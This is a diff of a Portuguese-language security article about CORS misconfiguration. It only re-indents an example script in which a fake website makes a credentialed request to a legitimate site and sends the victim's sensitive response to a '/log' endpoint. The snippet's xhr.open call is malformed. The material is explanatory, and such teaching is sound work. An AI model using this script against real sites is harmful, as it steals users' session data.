@@ -54,19 +54,19 @@ Algumas aplicações permitem que qualquer domínio acesse seus recursos. Uma fo
 Se a informação retorna dados sensíveis como dados de sessão, o *hacker* pode enviar um website fake para a vítima para colher esses dados, usando por exemplo o script abaixo:
 
 ```html
-    <script>
-        var xhr = new XMLHttpRequest();
-        var url = "https://site-legitimo";
+<script>
+    var xhr = new XMLHttpRequest();
+    var url = "https://site-legitimo";
             
-        xhr.onreadystatechange = function() {
-            if(xhr.readyState === XMLHttpRequest.DONE) {
-                    fetch("/log?key=" + xhr.responseText);
-            }
-        }
-        xhr.open("GET", url, "/sensitive-victim-data", true);
-        xhr.withCredentials = true;
-        xhr.send(null);
-    </script>
+    xhr.onreadystatechange = function() {
+       if(xhr.readyState === XMLHttpRequest.DONE) {
+            fetch("/log?key=" + xhr.responseText);
+	    }
+    }
+    xhr.open("GET", url, "/sensitive-victim-data", true);
+    xhr.withCredentials = true;
+    xhr.send(null);
+</script>
 ```
 
 ### Whitelists
